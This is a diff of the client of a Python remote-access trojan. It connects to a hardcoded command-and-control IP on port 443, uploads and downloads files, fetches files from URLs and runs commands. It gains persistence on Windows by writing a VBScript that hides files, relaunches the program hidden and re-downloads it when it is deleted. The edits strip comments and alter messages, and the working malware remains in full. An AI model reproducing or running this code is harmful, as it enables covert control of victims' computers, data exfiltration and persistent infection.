@@ -5,6 +5,7 @@ import sys
 import time
 import socket
 import subprocess
+from socket import AF_INET, SOCK_STREAM
 from urllib.request import urlopen
 from common import pr, clear, get_cipher
 from common import Encode, Decode, Send, Receive
@@ -13,50 +14,41 @@ HOST = '47.240.60.51'
 PORT = 443
 
 active = False
+sock = None
 
-# send to CnC
 def Upload(sock, file):
   try:
     f = open(file, 'rb')
   except IOError:
-    return 'Error opening file.'
+    return 'Error opening file'
 
-  while True:
-    d = f.read()
-    if not d:
-       break
-    Send(sock, d, '')
-
+  d = f.read()
+  Send(sock, d, '')
   f.close()
-  return 'File sent'
+  return 'File sent 🍺'
 
-# receive from CnC
 def Download(sock, file):
   try:
     f = open(file, 'wb')
   except IOError:
-    return 'Error opening file.'
+    return 'Error opening file'
 
   d = Receive(sock)
   f.write(d)
   f.close()
-  return 'File received'
+  return 'File received 🍺'
 
 # download from url (unencrypted)
 def Downhttp(sock, url):
-  # get filename from url
   filename = url.split('/')[-1].split('#')[0].split('?')[0]
   g = open(filename, 'wb')
-  # download file
   u = urlopen(url)
   g.write(u.read())
   g.close()
-  # let server know we're done...
   return "Finished download."
 
 # persistence
 def Persist(sock, redown=None, newdir=None):
-  # Windows/NT Methods
   if os.name == 'nt':
       # fetch executable's location
       exedir = os.path.join(sys.path[0], sys.argv[0])
@@ -75,7 +67,6 @@ def Persist(sock, redown=None, newdir=None):
           newexe = newdir.split('\\')[-1]
         vbscript = 'state = 1\nhidden = 0\nwshname = "' + exedir + '"\nvbsname = "' + vbsdir + '"\nurlname = "' + redown + '"\ndirname = "' + newdir + '"\nWhile state = 1\nexist1 = ReportFileStatus(wshname)\nexist2 = ReportFileStatus(dirname)\nIf exist1 = False And exist2 = False then\ndownload urlname, dirname\nEnd If\nIf exist1 = True Or exist2 = True then\nif exist1 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(wshname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nexist2 = False\nend if\nif exist2 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(dirname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nend if\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(vbsname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nSet WshShell = WScript.CreateObject ("WScript.Shell")\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\nFor Each objProcess in colProcessList\nif objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\nvFound = True\nEnd if\nNext\nIf vFound = True then\nwscript.sleep 50000\nEnd If\nIf vFound = False then\nIf exist1 = True then\nWshShell.Run """' + exedir + '""",hidden\nEnd If\nIf exist2 = True then\nWshShell.Run """' + dirname + '""",hidden\nEnd If\nwscript.sleep 50000\nEnd If\nvFound = False\nEnd If\nWend\nFunction ReportFileStatus(filespec)\nDim fso, msg\nSet fso = CreateObject("Scripting.FileSystemObject")\nIf (fso.FileExists(filespec)) Then\nmsg = True\nElse\nmsg = False\nEnd If\nReportFileStatus = msg\nEnd Function\nfunction download(sFileURL, sLocation)\nSet objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\nobjXMLHTTP.open "GET", sFileURL, false\nobjXMLHTTP.send()\ndo until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\nIf objXMLHTTP.Status = 200 Then\nSet objADOStream = CreateObject("ADODB.Stream")\nobjADOStream.Open\nobjADOStream.Type = 1\nobjADOStream.Write objXMLHTTP.ResponseBody\nobjADOStream.Position = 0\nSet objFSO = Createobject("Scripting.FileSystemObject")\nIf objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\nSet objFSO = Nothing\nobjADOStream.SaveToFile sLocation\nobjADOStream.Close\nSet objADOStream = Nothing\nEnd if\nSet objXMLHTTP = Nothing\nEnd function\n'
 
-      # open file & write
       vbs = open('vbscript.vbs', 'wb')
       vbs.write(vbscript)
       vbs.close()
@@ -97,10 +88,8 @@ def Exec(cmde):
   else:
     return "Enter a command.\n"
 
-# main loop
 while True:
   try:
-    from socket import AF_INET, SOCK_STREAM
     s = socket.socket(AF_INET, SOCK_STREAM)
     s.connect((HOST, PORT))
 
@@ -109,7 +98,6 @@ while True:
     # waiting to be activated...
     data = Receive(s)
 
-    # activate.
     if data == 'activate':
       active = True
       Send(s, "\n"+os.getcwd()+">")
